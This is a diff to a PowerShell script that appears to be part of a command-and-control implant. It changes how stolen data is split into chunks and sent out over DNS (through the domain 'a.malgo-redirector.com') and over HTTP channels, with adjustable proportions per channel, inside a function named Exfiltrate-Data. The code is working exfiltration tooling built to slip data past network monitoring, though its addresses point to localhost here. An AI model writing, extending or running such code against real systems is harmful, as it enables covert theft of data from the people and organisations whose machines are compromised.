@@ -1,6 +1,6 @@
 $dnsAddr = "127.0.0.1"
 $domain = "a.malgo-redirector.com"
-$dnsChunkLength = 40 - $domain.Length
+$dnsChunkLength = 80 - $domain.Length
 if ($dnsChunkLength % 2 -ne 0) { $dnsChunkLength -= 1 }
 
 $httpAddr = "http://127.0.0.1:8088"
@@ -15,26 +15,66 @@ $chunkLengths = @{
     HTTP = $httpChunkLength
 }
 
+# Proportions of each channel, described as
+# a relationship between the number of chunks
+$proportions = @{
+    DNS  = 1
+    HTTP = 1
+}
+
 filter chunks {
     param (
         [Parameter(ValueFromPipeline = $true)]
         [String]$t,
         [Parameter(Mandatory = $true)]
-        [hashtable]$ChunkLengths
+        [hashtable]$ChunkLengths,
+        [Parameter(Mandatory = $false)]
+        [hashtable]$Proportions
     )
 
     $result = @()
+
+    if ($null -eq $Proportions) {
+        $Proportions = @{}
+        $ChunkLengths.Keys | % { $Proportions[$_] = 1 }
+    }
     
+    # while ($t.Length -gt 0) {
+    #     $name = $ChunkLengths.Keys | Get-Random
+    #     $possibleLengths = $ChunkLengths[$name]
+    #     Write-Host "Transport: $name"
+    #     Write-Host "Possible Lengths: $possibleLengths"
+    #     Write-Host "Data Length: $($t.Length)"
+    #     $chunkSize = [math]::Min($t.Length, $possibleLengths)
+
+    #     $chunk = $t.Substring(0, $chunkSize)
+    #     $t = $t.Substring($chunkSize)
+
+    #     $result += @{"name" = $name; "chunk" = $chunk }
+    # }
+
+    # proportions need to reflect the length of the data.
+    # Right now they are just a ratio of the number of chunks
+    $sum = $Proportions.Values | Measure-Object -Sum | Select-Object -ExpandProperty Sum
+    $chunkLength = $t.Length / $sum
+    $newProportions = @{}
+    $Proportions.Keys | % {
+        $name = $_
+        $newProportions[$name] = [math]::Ceiling($Proportions[$name] * $chunkLength)
+    }
+    $Proportions = $newProportions
+
     while ($t.Length -gt 0) {
-        $name = $ChunkLengths.Keys | Get-Random
-        $possibleLengths = $ChunkLengths[$name]
-        Write-Host "Transport: $name"
-        Write-Host "Possible Lengths: $possibleLengths"
-        Write-Host "Data Length: $($t.Length)"
-        $chunkSize = [math]::Min($t.Length, $possibleLengths)
+        $name = $Proportions.Keys | Get-Random
+        Write-Host $Proportions.Keys
+        $chunkSize = [math]::Min($t.Length, [math]::Min($ChunkLengths[$name], $Proportions[$name]))
 
         $chunk = $t.Substring(0, $chunkSize)
         $t = $t.Substring($chunkSize)
+        $Proportions[$name] -= $chunkSize
+        if ($Proportions[$name] -le 0) {
+            $Proportions.Remove($name)
+        }
 
         $result += @{"name" = $name; "chunk" = $chunk }
     }
@@ -371,7 +411,7 @@ function Exfiltrate-Data {
     Write-Host "Setting result length to: $($dataToSend.Length)"
     Set-ResultLength -commandId $commandId -data $dataToSend
 
-    $chunks = $dataToSend | chunks -ChunkLengths $chunkLengths
+    $chunks = $dataToSend | chunks -ChunkLengths $chunkLengths -Proportions $proportions
 
     foreach ($chunk in $chunks) {
         Send-ResultChunk -channel $chunk.name -commandId $commandId -offset $offset -chunk $chunk.chunk
